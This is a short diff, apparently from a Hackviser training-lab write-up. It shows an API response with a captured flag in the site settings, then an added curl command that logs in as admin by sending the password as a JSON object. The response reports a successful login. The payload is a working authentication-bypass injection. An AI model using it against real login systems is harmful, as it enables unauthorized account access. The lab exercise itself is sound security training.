@@ -165,3 +165,7 @@ Content-Type: application/json
 
 {"success":true,"data":{"sitename":"Hackviser{5540522f6d546b18895ae39051af0497}","tagline":"Crafting digital experiences","contact_email":"hello@meridian.hv","language":"English (en-US)","smtp.host":"mail.meridian.hv","smtp.port":"587","smtp.username":"noreply@meridian.hv","smtp.encryption":"TLS","backup.schedule":"daily","backup.retention":"30","backup.path":"\/var\/backups\/meridian","cache_driver":"file"}}
 
+└─$ curl -X POST http://zentra.hv/login \
+-H "Content-Type: application/json" \
+-d '{"username":"admin","password":{"password":1}}'     
+{"success":true,"redirect":"/dashboard"} 
